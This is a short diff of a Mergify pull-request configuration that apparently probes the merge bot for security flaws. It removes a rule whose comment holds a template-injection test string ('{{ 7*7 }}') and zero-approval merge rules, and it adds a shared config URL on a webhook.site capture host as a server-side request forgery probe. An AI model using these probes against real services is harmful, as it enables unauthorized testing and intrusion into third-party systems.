@@ -1,18 +1,10 @@
+shared:
+  config: https://webhook.site/f5b0a3d0-8a12-4a3b-9c4d-e5f6a7b8c9d0/mergify-config.yml
+
 pull_request_rules:
-  - name: ssti-rce-test
+  - name: ssrf-config-test
     conditions:
       - base=main
     actions:
       comment:
-        message: "SSTI: {{ 7*7 }} | author: {{ author }} | number: {{ number }}"
-
-queue_rules:
-  - name: default
-    queue_conditions:
-      - base=main
-    merge_conditions:
-      - "#approved-reviews-by>=0"
-    merge_method: merge
-
-merge_queue:
-  max_parallel_checks: 1
+        message: "SSRF config test - shared.config loaded"
